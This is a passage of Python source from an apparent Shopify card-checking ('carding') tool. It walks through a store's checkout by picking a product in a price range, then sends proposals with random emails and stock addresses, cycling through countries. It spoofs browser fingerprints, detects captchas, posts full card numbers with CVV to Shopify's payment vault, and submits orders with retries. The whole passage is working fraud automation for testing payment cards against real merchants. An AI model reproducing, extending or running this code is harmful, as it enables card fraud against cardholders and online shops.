    checkout_url = r.url
    try:
        checkout_html = r.text
    except (UnicodeDecodeError, UnicodeError):
        try:
            checkout_html = r.content.decode("utf-8", errors="replace")
        except Exception:
            checkout_html = ""

    if "/checkouts/cn/" not in checkout_url:
        try:
            r_chk = client.eyelifter_get(
                f"{shop_url}/checkout",
                allow_redirects=True,
                timeout=12
            )
            if "/checkouts/cn/" in r_chk.url:
                checkout_url = r_chk.url
                try:
                    checkout_html = r_chk.text
                except (UnicodeDecodeError, UnicodeError):
                    try:
                        checkout_html = r_chk.content.decode("utf-8", errors="replace")
                    except Exception:
                        checkout_html = ""
            else:
                raise Exception("checkout redirect failed")
        except Exception:
            raise Exception("checkout load failed")

    if locale and "/checkouts/cn/" in checkout_url and f"/{locale}/" not in checkout_url:
        p = urllib.parse.urlparse(checkout_url)
        tm = re.search(r"/checkouts/cn/([^/?]+)", p.path)
        if tm:
            checkout_url = urllib.parse.urlunparse(
                p._replace(path=f"/checkouts/cn/{tm.group(1)}/{locale}/")
            )

    if "?" in checkout_url and not re.search(r"/\?", checkout_url):
        p = urllib.parse.urlparse(checkout_url)
        path = p.path if p.path.endswith("/") else p.path + "/"
        checkout_url = urllib.parse.urlunparse(p._replace(path=path))

    m = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
    checkout_token = m.group(1) if m else ""
    m = re.search(
        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
        checkout_html
    )
    session_token = html.unescape(m.group(1)).strip('"') if m else ""
    return checkout_url, checkout_token, session_token, checkout_html


def eyelifter_send_proposal(client, checkout_url, checkout_token,
                             session_token, stable_id, variant_id, build_id,
                             source_token, queue_token, email, addr,
                             currency, country, phase):
    p = urllib.parse.urlparse(checkout_url)
    origin = f"{p.scheme}://{p.netloc}"

    if phase == "empty":
        dest = {
            "partialStreetAddress": {
                "address1": "",
                "city": "",
                "countryCode": "US",
                "lastName": "",
                "phone": "",
                "oneTimeUse": False,
            }
        }
        buyer = {
            "customer": {
                "presentmentCurrency": currency,
                "countryCode": country,
            },
            "phoneCountryCode": country,
            "marketingConsent": [],
            "shopPayOptInPhone": {"countryCode": country},
            "rememberMe": False,
        }
        billing = {
            "streetAddress": {
                "address1": "",
                "city": "",
                "countryCode": "US",
                "lastName": "",
                "phone": "",
            }
        }
    elif phase == "email":
        dest = {
            "partialStreetAddress": {
                "address1": "",
                "city": "",
                "countryCode": "US",
                "lastName": "",
                "phone": "",
                "oneTimeUse": False,
            }
        }
        buyer = {
            "customer": {
                "presentmentCurrency": currency,
                "countryCode": country,
            },
            "email": email,
            "emailChanged": True,
            "phoneCountryCode": country,
            "marketingConsent": [],
            "shopPayOptInPhone": {"countryCode": country},
            "rememberMe": False,
        }
        billing = {
            "streetAddress": {
                "address1": "",
                "city": "",
                "countryCode": "US",
                "lastName": "",
                "phone": "",
            }
        }
    else:
        dest = {
            "partialStreetAddress": eyelifter_addr_json(addr, partial=True)
        }
        buyer = {
            "customer": {
                "presentmentCurrency": currency,
                "countryCode": country,
            },
            "email": email,
            "emailChanged": False,
            "phoneCountryCode": country,
            "marketingConsent": [],
            "shopPayOptInPhone": {"countryCode": country},
            "rememberMe": False,
        }
        billing = {
            "streetAddress": {
                k: v for k, v in eyelifter_addr_json(addr, partial=True).items()
                if k not in ("oneTimeUse", "coordinates")
            }
        }

    body = {
        "variables": {
            "sessionInput": {"sessionToken": session_token},
            "queueToken": queue_token,
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": dest,
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True,
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None,
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponentsSource": None,
                    "lineComponents": [],
                }]
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": billing,
            },
            "buyerIdentity": buyer,
            "tip": {"tipLines": []},
            "poNumber": None,
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"any": True},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": [],
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": [],
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
        },
        "operationName": "Proposal",
        "id": eyelifter_qids_for(build_id)["proposal"],
    }
    url = f"{origin}/checkouts/internal/graphql/persisted?operationName=Proposal"
    r = client.eyelifter_gql_post(
        url,
        body,
        eyelifter_gql_headers(
            client,
            checkout_url,
            checkout_token,
            session_token,
            build_id,
            source_token,
        ),
    )
    return r.status_code, r.text


def eyelifter_send_pci(client, ident_sig, card, shop_domain, vault_url):
    scope = (
        shop_domain[4:]
        if shop_domain.startswith("www.")
        else shop_domain
    )
    candidates = []
    if vault_url:
        candidates.append(vault_url)
    candidates.append("https://checkout.pci.shopifyinc.com/sessions")
    candidates.append("https://deposit.shopifycs.com/sessions")
    seen = set()
    endpoints = []
    for c in candidates:
        if c and c not in seen:
            seen.add(c)
            endpoints.append(c)

    payload = {
        "credit_card": {
            "number": card["number"],
            "month": card["month"],
            "year": card["year"],
            "verification_value": card["cvv"],
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": card["name"],
        },
        "payment_session_scope": scope,
    }

    last_status = 0
    last_body = ""
    for endpoint in endpoints:
        origin = (
            endpoint.rsplit("/sessions", 1)[0]
            if "/sessions" in endpoint
            else "https://checkout.pci.shopifyinc.com"
        )
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": origin,
            "referer": f"{origin}/build/09497de/number-ltr.html?identifier=&locationURL=",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "shopify-identification-signature": ident_sig,
        }
        if not getattr(client, "_cffi_active", False):
            ua = getattr(client, "ua", eyelifter_UA)
            headers["user-agent"] = ua
            ch, mob, plat = eyelifter_fp_from_ua(ua)
            if ch:
                headers["sec-ch-ua"] = ch
                headers["sec-ch-ua-mobile"] = mob
                headers["sec-ch-ua-platform"] = plat
        try:
            r = client.eyelifter_post(endpoint, json=payload, headers=headers, timeout=20)
        except Exception:
            continue
        last_status = r.status_code
        last_body = r.text
        if r.status_code == 200 and eyelifter_scrape_pci_id(r.text):
            return r.status_code, r.text
    return last_status, last_body

def eyelifter_send_submit(client, checkout_url, checkout_token,
                           session_token, build_id, source_token, params):
    p = urllib.parse.urlparse(checkout_url)
    origin = f"{p.scheme}://{p.netloc}"
    handles_json = [
        {"signedHandle": h} for h in (params["signed_handles"] or [])
    ]
    addr_full = eyelifter_addr_json(params["addr"], partial=False)
    billing = {
        k: v for k, v in addr_full.items()
        if k not in ("oneTimeUse", "coordinates")
    }
    credit_bin = params["card_number"].replace(" ", "")[:8]

    if params["is_digital"]:
        delivery = {
            "deliveryLines": [{
                "selectedDeliveryStrategy": {
                    "deliveryStrategyMatchingConditions": {
                        "estimatedTimeInTransit": {"any": True},
                        "shipments": {"any": True},
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {
                    "lines": [{"stableId": params["stable_id"]}]
                },
                "deliveryMethodTypes": ["NONE"],
                "expectedTotalPrice": {"any": True},
                "destinationChanged": True,
            }],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        }
        de = {"deliveryExpectationLines": []}
    else:
        delivery = {
            "deliveryLines": [{
                "destination": {"streetAddress": addr_full},
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {
                        "handle": params["delivery_handle"],
                        "customDeliveryRate": False,
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {
                    "lines": [{"stableId": params["stable_id"]}]
                },
                "deliveryMethodTypes": ["SHIPPING"],
                "expectedTotalPrice": {"any": True},
                "destinationChanged": False,
            }],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        }
        de = {"deliveryExpectationLines": handles_json}

    _ck = params.get("checkpoint_data")
    _pt = params.get("payment_terms_id")
    input_payload = {
        "sessionInput": {"sessionToken": session_token},
        **({"checkpointData": _ck} if _ck else {}),
        "queueToken": params["queue_token"],
        **({"paymentFlexibilityPaymentTermsTemplate": {"id": _pt}} if _pt else {}),
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": delivery,
        "deliveryExpectations": de,
        "merchandise": {
            "merchandiseLines": [{
                "stableId": params["stable_id"],
                "merchandise": {
                    "productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{params['variant_id']}",
                        "variantId": f"gid://shopify/ProductVariant/{params['variant_id']}",
                        "properties": [],
                        "sellingPlanId": None,
                        "sellingPlanDigest": None,
                    }
                },
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"any": True},
                "lineComponentsSource": None,
                "lineComponents": [],
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"any": True},
            "paymentLines": [{
                "paymentMethod": {
                    "directPaymentMethod": {
                        "paymentMethodIdentifier": params["payment_method_id"],
                        "sessionId": params["pci_session_id"],
                        "billingAddress": {"streetAddress": billing},
                        "cardSource": None,
                    },
                    "giftCardPaymentMethod": None,
                    "redeemablePaymentMethod": None,
                    "walletPaymentMethod": None,
                    "walletsPlatformPaymentMethod": None,
                    "localPaymentMethod": None,
                    "paymentOnDeliveryMethod": None,
                    "manualPaymentMethod": None,
                    "customPaymentMethod": None,
                    "offsitePaymentMethod": None,
                    "customOnsitePaymentMethod": None,
                    "deferredPaymentMethod": None,
                    "customerCreditCardPaymentMethod": None,
                    "paypalBillingAgreementPaymentMethod": None,
                    "remotePaymentInstrument": None,
                },
                "amount": {
                    "value": {
                        "amount": params["total_amount"],
                        "currencyCode": params["currency"],
                    }
                },
            }],
            "billingAddress": {"streetAddress": billing},
            "creditCardBin": credit_bin,
            "allowStoreCredit": False,
        },
        "buyerIdentity": {
            "customer": {
                "presentmentCurrency": params["currency"],
                "countryCode": params["country"],
            },
            "email": params["email"],
            "emailChanged": False,
            "phoneCountryCode": params["country"],
            "marketingConsent": [{
                "email": {
                    "consentState": "GRANTED",
                    "value": params["email"],
                }
            }],
            "shopPayOptInPhone": {"countryCode": params["country"]},
            "rememberMe": False,
        },
        "tip": {"tipLines": []},
        "poNumber": None,
        "taxes": {
            "proposedAllocations": None,
            "proposedTotalAmount": {
                "value": {
                    "amount": params["tax_amount"],
                    "currencyCode": params["currency"],
                }
            },
            "proposedTotalIncludedAmount": None,
            "proposedMixedStateTotalAmount": None,
            "proposedExemptions": [],
        },
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "shopPayArtifact": {
            "optIn": {
                "vaultEmail": "",
                "vaultPhone": "",
                "optInSource": "REMEMBER_ME",
            }
        },
        "nonNegotiableTerms": None,
        "scriptFingerprint": {
            "signature": None,
            "signatureUuid": None,
            "lineItemScriptChanges": [],
            "paymentScriptChanges": [],
            "shippingScriptChanges": [],
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": [],
    }

    body = {
        "variables": {
            "input": input_payload,
            "attemptToken": params["attempt_token"],
            "metafields": [],
            "analytics": {
                "requestUrl": checkout_url,
                "pageId": params["page_id"],
            },
        },
        "operationName": "SubmitForCompletion",
        "id": eyelifter_qids_for(build_id)["submit"],
    }
    url = f"{origin}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
    r = client.eyelifter_gql_post(
        url,
        body,
        eyelifter_gql_headers(
            client,
            checkout_url,
            checkout_token,
            session_token,
            build_id,
            source_token,
        ),
    )
    return r.status_code, r.text


def eyelifter_send_poll(client, checkout_url, checkout_token,
                        session_token, build_id, source_token,
                        receipt_id, receipt_token):
    if eyelifter_STOP.is_set():
        return None, ""
    p = urllib.parse.urlparse(checkout_url)
    origin = f"{p.scheme}://{p.netloc}"
    q = {
        "operationName": "PollForReceipt",
        "variables": json.dumps({
            "receiptId": receipt_id,
            "sessionToken": receipt_token,
        }),
        "id": eyelifter_qids_for(build_id)["poll"],
    }
    url = f"{origin}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(q)}"
    headers = eyelifter_gql_headers(
        client,
        checkout_url,
        checkout_token,
        session_token,
        build_id,
        source_token,
    )
    try:
        r = client.session.get(url, headers=headers, timeout=15, verify=False)
        client.last_response = r
    except Exception:
        return None, ""
    return r.status_code, r.text


def eyelifter_fire_extension_metafields(client, checkout_url, checkout_token,
                                         session_token, build_id, source_token,
                                         product_ids, profile_id):
    if not profile_id:
        return False
    p = urllib.parse.urlparse(checkout_url)
    origin = f"{p.scheme}://{p.netloc}"
    body = {
        "variables": {
            "resourceIds": product_ids,
            "checkoutProfileId": profile_id,
        },
        "operationName": "ActivatedExtensionMetafields",
        "id": eyelifter_qids_for(build_id)["ext"],
    }
    try:
        url = f"{origin}/checkouts/internal/graphql/persisted?operationName=ActivatedExtensionMetafields"
        r = client.eyelifter_gql_post(
            url,
            body,
            eyelifter_gql_headers(
                client,
                checkout_url,
                checkout_token,
                session_token,
                build_id,
                source_token,
            ),
        )
        return r.status_code == 200
    except Exception:
        return False


def eyelifter_result_template(shop_url):
    domain = urllib.parse.urlparse(shop_url).netloc
    domain_clean = domain[4:] if domain.startswith("www.") else domain
    return {
        "url": shop_url,
        "domain": domain_clean,
        "verdict": "ERROR",
        "code": "",
        "amount": "",
        "currency": "USD",
        "variant_id": "",
        "product_title": "",
        "handle": "",
        "elapsed": 0.0,
        "card_masked": "",
        "gateway": "",
        "country": "",
    }


def eyelifter_check_site(shop_url, card_entry, proxy_url="",
                          min_price=None, max_price=None, fixed_country=None,
                          skip_countries=None):
    result = eyelifter_result_template(shop_url)
    start = time.monotonic()
    country = fixed_country or "US"
    skip_countries = set(skip_countries or ())

    try:
        card = eyelifter_parse_card(card_entry)
    except Exception as e:
        result["code"] = f"card_parse: {e}"
        result["elapsed"] = round(time.monotonic() - start, 1)
        return result

    result["card_masked"] = card["raw"]
    email = eyelifter_random_email()
    client = eyelifter_Client(proxy=proxy_url)

    try:
        try:
            title, product_id, variant_id, price, handle, is_dig_hint, price_currency = \
                eyelifter_find_product(
                    client,
                    shop_url,
                    min_price=min_price,
                    max_price=max_price,
                )
        except Exception as e:
            err = str(e)
            if "no products in price range" in err:
                result["verdict"] = "OUT_OF_RANGE"
                result["code"] = "OUT_OF_RANGE"
            else:
                result["code"] = f"{type(e).__name__}: {err[:60]}"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        currency = price_currency or "USD"
        result["variant_id"] = variant_id
        result["product_title"] = title
        result["handle"] = handle
        result["amount"] = price
        result["currency"] = currency
        eyelifter_dbg("FOUND", f"variant={variant_id} price={price} cur={currency}")

        checkout_url = None
        checkout_token = None
        session_token = None
        checkout_html = None
        resp_headers = {}

        try:
            cu, ct, st, ch = eyelifter_cart_to_checkout(
                client,
                shop_url,
                variant_id,
                handle,
                locale="",
            )
            if ch and "/checkouts/cn/" in cu:
                if "login" in cu.lower() or "password" in cu.lower():
                    result["verdict"] = "LOGIN_REQUIRED"
                    result["code"] = "LOGIN_REQUIRED"
                    result["elapsed"] = round(time.monotonic() - start, 1)
                    return result
                checkout_url = cu
                checkout_token = ct
                session_token = st
                checkout_html = ch
                if client.last_response is not None:
                    resp_headers = dict(client.last_response.headers)
        except Exception as e:
            result["code"] = f"CHECKOUT_LOAD_FAILED ({str(e)[:40]})"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        if not checkout_html:
            result["code"] = "CHECKOUT_LOAD_FAILED"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        _cur_detected, _cur_conf, _cur_sources = eyelifter_resolve_currency(
            client, shop_url, handle, checkout_html, None)
        if _cur_detected and _cur_detected != currency:
            eyelifter_dbg(
                "CURRENCY",
                f"pre-flight: {currency} -> {_cur_detected} ({_cur_conf}) sources={_cur_sources}",
            )
            currency = _cur_detected
        elif _cur_detected == currency:
            eyelifter_dbg("CURRENCY", f"pre-flight confirmed {currency} ({_cur_conf})")
        if _cur_conf == "medium" and len(set(_cur_sources.values())) > 1:
            eyelifter_log(
                "⚠️", "WARN", "CURRENCY",
                f"conflict {_cur_sources} — using {currency}",
            )

        build_id = eyelifter_scrape_build_id(checkout_html, resp_headers)
        source_token = eyelifter_scrape_source_token(checkout_html)

        m = re.search(
            r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-'
            r'[0-9a-f]{4}-[0-9a-f]{12})"',
            html.unescape(checkout_html),
        )
        if m:
            stable_id = m.group(1)
        else:
            stable_id = str(uuid.uuid4())
            eyelifter_dbg("STABLE_ID", "scrape failed — random UUID")

        scraped_page_id = eyelifter_scrape_page_id(checkout_html)
        page_id = scraped_page_id or eyelifter_mixed_uuid()

        pat_id = eyelifter_scrape_pat_id(checkout_html)
        if pat_id:
            p = urllib.parse.urlparse(checkout_url)
            try:
                client.eyelifter_get(
                    f"{p.scheme}://{p.netloc}/private_access_tokens"
                    f"?id={urllib.parse.quote(pat_id)}&checkout_type=c1",
                    headers={"accept": "*/*", "referer": checkout_url},
                    timeout=8,
                )
            except Exception:
                pass

        _, p1 = eyelifter_send_proposal(
            client,
            checkout_url,
            checkout_token,
            session_token,
            stable_id,
            variant_id,
            build_id,
            source_token,
            "",
            email,
            None,
            currency,
            country,
            "empty",
        )

        cap = eyelifter_scrape_proposal_captcha(p1)
        if cap:
            result["verdict"] = "CAPTCHA_PROPOSAL"
            result["code"] = f"{cap['provider'].upper()}_REQUIRED"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        if "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP" in p1:
            new_cur, conf, srcs = eyelifter_resolve_currency(
                client, shop_url, handle, checkout_html, p1)
            if new_cur and new_cur != currency:
                eyelifter_log(
                    "⚠️", "WARN", "CURRENCY",
                    f"shop forces {new_cur} ({conf}), was {currency} — retrying P1",
                )
                currency = new_cur
                _, p1 = eyelifter_send_proposal(
                    client, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, build_id, source_token,
                    "", email, None, currency, country, "empty",
                )
                cap = eyelifter_scrape_proposal_captcha(p1)
                if cap:
                    result["verdict"] = "CAPTCHA_PROPOSAL"
                    result["code"] = f"{cap['provider'].upper()}_REQUIRED"
                    result["elapsed"] = round(time.monotonic() - start, 1)
                    return result
                if "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP" in p1:
                    result["code"] = "CURRENCY_MISMATCH"
                    result["elapsed"] = round(time.monotonic() - start, 1)
                    return result

        cur = eyelifter_scrape_currency(p1)
        if cur:
            currency = cur
        supported = eyelifter_scrape_supported_countries(p1)
        queue_token = eyelifter_scrape_queue_token(p1)
        profile_id = eyelifter_scrape_profile_id(p1)

        if not queue_token:
            result["code"] = "PROPOSAL_1_FAILED"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        if profile_id:
            eyelifter_fire_extension_metafields(
                client,
                checkout_url,
                checkout_token,
                session_token,
                build_id,
                source_token,
                [
                    f"gid://shopify/Product/{product_id}",
                    f"gid://shopify/ProductVariant/{variant_id}",
                ],
                profile_id,
            )

        _, p2 = eyelifter_send_proposal(
            client,
            checkout_url,
            checkout_token,
            session_token,
            stable_id,
            variant_id,
            build_id,
            source_token,
            queue_token,
            email,
            None,
            currency,
            country,
            "email",
        )

        cap = eyelifter_scrape_proposal_captcha(p2)
        if cap:
            result["verdict"] = "CAPTCHA_PROPOSAL"
            result["code"] = f"{cap['provider'].upper()}_REQUIRED"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        s2 = eyelifter_scrape_supported_countries(p2)
        if s2:
            supported = s2
        queue_token2 = eyelifter_scrape_queue_token(p2)
        if not queue_token2:
            result["code"] = "PROPOSAL_2_FAILED"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        if country in supported:
            initial = country
        elif supported:
            initial = supported[0]
        else:
            initial = country
        if fixed_country:
            initial = fixed_country

        tried = set()
        try_list = []
        if supported:
            for c in supported:
                if c in eyelifter_ADDRS and c not in tried and c not in skip_countries:
                    try_list.append(c)
                    tried.add(c)
        for c in eyelifter_ADDR_FALLBACK:
            if c in eyelifter_ADDRS and c not in tried and c not in skip_countries:
                try_list.append(c)
                tried.add(c)

        if not try_list:
            result["code"] = "ALL_COUNTRIES_EXHAUSTED"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        if initial in skip_countries:
            initial = try_list[0]
        if initial in try_list:
            try_list.remove(initial)
            try_list.insert(0, initial)

        final_p3 = None
        final_qt3 = None
        is_digital = False
        final_country = initial
        qt2 = queue_token2

        for attempt_country in try_list:
            addr_list = eyelifter_ADDRS.get(attempt_country) or eyelifter_ADDRS["US"]
            addr = random.choice(addr_list).copy()
            _, p3 = eyelifter_send_proposal(
                client,
                checkout_url,
                checkout_token,
                session_token,
                stable_id,
                variant_id,
                build_id,
                source_token,
                qt2,
                email,
                addr,
                currency,
                attempt_country,
                "address",
            )

            cap = eyelifter_scrape_proposal_captcha(p3)
            if cap:
                result["verdict"] = "CAPTCHA_PROPOSAL"
                result["code"] = f"{cap['provider'].upper()}_REQUIRED"
                result["elapsed"] = round(time.monotonic() - start, 1)
                return result

            _qt3 = eyelifter_scrape_queue_token(p3)
            if not _qt3:
                more = eyelifter_scrape_supported_countries(p3)
                for c in more:
                    if c in eyelifter_ADDRS and c not in tried:
                        try_list.append(c)
                        tried.add(c)
                continue

            _is_dig = (not eyelifter_scrape_shipping_required(p3)) or is_dig_hint
            if _is_dig or not eyelifter_has_shipping_restriction(p3):
                final_p3 = p3
                final_qt3 = _qt3
                is_digital = _is_dig
                final_country = attempt_country
                break

            qt2 = _qt3
            more = eyelifter_scrape_supported_countries(p3)
            for c in more:
                if c in eyelifter_ADDRS and c not in tried:
                    try_list.append(c)
                    tried.add(c)

        if not final_p3:
            result["code"] = "ALL_COUNTRIES_EXHAUSTED"
            result["country"] = ",".join(sorted(tried))
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        addr_list = eyelifter_ADDRS.get(final_country) or eyelifter_ADDRS["US"]
        addr = random.choice(addr_list).copy()
        country = final_country
        result["country"] = final_country
        queue_token3 = final_qt3

        _, p4 = eyelifter_send_proposal(
            client,
            checkout_url,
            checkout_token,
            session_token,
            stable_id,
            variant_id,
            build_id,
            source_token,
            queue_token3,
            email,
            addr,
            currency,
            country,
            "address",
        )

        try:
            p4 = eyelifter_wait_for_final_p4(
                client, checkout_url, checkout_token, session_token,
                stable_id, variant_id, build_id, source_token,
                queue_token3, email, addr, currency, country,
                p4, max_polls=12,
            )
        except Exception as e:
            eyelifter_dbg("P4POLL", f"poll crashed: {type(e).__name__}: {str(e)[:60]}")

        payment_method_id = (
            eyelifter_scrape_payment_method_id(p4) or
            eyelifter_scrape_payment_method_id(p3) or
            eyelifter_scrape_payment_method_id(p2) or
            eyelifter_scrape_payment_method_id(p1)
        )
        result["gateway"] = (
            eyelifter_scrape_gateway(p4) or
            eyelifter_scrape_gateway(p3) or
            eyelifter_scrape_gateway(p2) or
            eyelifter_scrape_gateway(p1)
        )

        if not payment_method_id:
            result["code"] = "NO_PAYMENT_METHOD"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        delivery_handle = (
            eyelifter_scrape_delivery_handle(p4) or
            eyelifter_scrape_delivery_handle(p3)
        )
        _amt, _cur, _src = eyelifter_resolve_price(p4)
        if not _amt:
            for _retry_attempt in range(2):
                try:
                    time.sleep(0.8)
                    _, p4_retry = eyelifter_send_proposal(
                        client, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, build_id, source_token,
                        eyelifter_scrape_queue_token(p4) or queue_token3,
                        email, addr, currency, country, "address",
                    )
                    p4_try = eyelifter_wait_for_final_p4(
                        client, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, build_id, source_token,
                        eyelifter_scrape_queue_token(p4_retry) or queue_token3,
                        email, addr, currency, country,
                        p4_retry, max_polls=10,
                    )
                    _amt, _cur, _src = eyelifter_resolve_price(p4_try)
                    if _amt:
                        p4 = p4_try
                        break
                except Exception:
                    pass
        if not _amt:
            result["code"] = "NO_CHECKOUT_TOTAL"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result
        total_amount = _amt
        currency = _cur
        eyelifter_dbg("PRICE", f"total={_amt} {_cur} (source={_src})")
        tax_amount = eyelifter_scrape_tax(p4)
        checkpoint_data = eyelifter_scrape_checkpoint(p4)
        payment_terms_id = eyelifter_scrape_payment_terms_id(p4)
        result["amount"] = total_amount
        result["currency"] = currency

        ident_sig = eyelifter_scrape_ident_sig(checkout_html)
        if not ident_sig:
            result["code"] = "NO_IDENT_SIG"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        pci_status, pci_body = eyelifter_send_pci(
            client,
            ident_sig,
            card,
            result["domain"],
            eyelifter_scrape_vault_url(checkout_html),
        )
        pci_session_id = eyelifter_scrape_pci_id(pci_body)
        if not pci_session_id:
            result["code"] = f"PCI_HTTP_{pci_status}"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        queue_token5 = eyelifter_scrape_queue_token(p4)
        signed_handles = eyelifter_scrape_signed_handles(p4)

        if not delivery_handle and not is_digital:
            result["code"] = "NO_DELIVERY_HANDLE"
            result["elapsed"] = round(time.monotonic() - start, 1)
            return result

        attempt_token = (
            f"{checkout_token}-"
            f"{eyelifter_ra(10, 'abcdefghijklmnopqrstuvwxyz0123456789')}"
        )

        submit_params = {
            "session_token": session_token,
            "queue_token": queue_token5,
            "stable_id": stable_id,
            "variant_id": variant_id,
            "email": email,
            "addr": addr,
            "delivery_handle": delivery_handle,
            "pci_session_id": pci_session_id,
            "attempt_token": attempt_token,
            "currency": currency,
            "country": country,
            "signed_handles": signed_handles,
            "payment_method_id": payment_method_id,
            "card_number": card["number"],
            "page_id": page_id,
            "is_digital": is_digital,
            "total_amount": total_amount,
            "tax_amount": tax_amount,
            "checkpoint_data": checkpoint_data,
            "payment_terms_id": payment_terms_id,
        }

        submit_status = 0
        submit_body = ""
        digital_retry = False

        for _submit_round in range(1, 5):
            submit_status, submit_body = eyelifter_send_submit(
                client,
                checkout_url,
                checkout_token,
                session_token,
                build_id,
                source_token,
                submit_params,
            )

            if ("WAITING_PENDING_TERMS" in submit_body
                or "PENDING_TERMS" in submit_body
                or "PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH" in submit_body
                or "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH" in submit_body):
                eyelifter_dbg("SUBMIT", f"round {_submit_round}: server pending — re-polling P4")
                try:
                    _refresh_qt = eyelifter_scrape_queue_token(p4) or submit_params["queue_token"]
                    _, p4_refresh = eyelifter_send_proposal(
                        client, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, build_id, source_token,
                        _refresh_qt, email, addr, submit_params["currency"],
                        submit_params["country"], "address",
                    )
                    p4 = eyelifter_wait_for_final_p4(
                        client, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, build_id, source_token,
                        _refresh_qt, email, addr, submit_params["currency"],
                        submit_params["country"], p4_refresh, max_polls=10,
                    )
                    _new_qt = eyelifter_scrape_queue_token(p4)
                    if _new_qt:
                        submit_params["queue_token"] = _new_qt
                    _new_pt = eyelifter_scrape_payment_terms_id(p4)
                    if _new_pt:
                        submit_params["payment_terms_id"] = _new_pt
                    _new_dh = eyelifter_scrape_delivery_handle(p4)
                    if _new_dh:
                        submit_params["delivery_handle"] = _new_dh
                    _new_sh = eyelifter_scrape_signed_handles(p4)
                    if _new_sh:
                        submit_params["signed_handles"] = _new_sh
                    _new_ck = eyelifter_scrape_checkpoint(p4)
                    if _new_ck:
                        submit_params["checkpoint_data"] = _new_ck
                    _amt2, _cur2, _src2 = eyelifter_resolve_price(p4)
                    if _amt2 and _cur2:
                        try:
                            if float(_amt2) > 0.01:
                                submit_params["total_amount"] = _amt2
                                submit_params["currency"] = _cur2
                        except (ValueError, TypeError):
                            pass
                    _tax2 = eyelifter_scrape_tax(p4)
                    if _tax2:
                        submit_params["tax_amount"] = _tax2
                    time.sleep(0.8)
                except Exception as _pex:
                    eyelifter_dbg("SUBMIT", f"re-poll crashed: {type(_pex).__name__}: {str(_pex)[:60]}")
                continue

            if (
                "SUM_OF_PROPOSED_PAYMENTS" in submit_body or
                "CANNOT_COVER" in submit_body or
                "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in submit_body or
                "AMOUNT_MISMATCH" in submit_body or
                "MERCHANDISE_EXPECTED_PRICE_MISMATCH" in submit_body or
                "order total has changed" in submit_body.lower()
            ):
                err_amt, err_cur, err_src = eyelifter_resolve_price(submit_body)
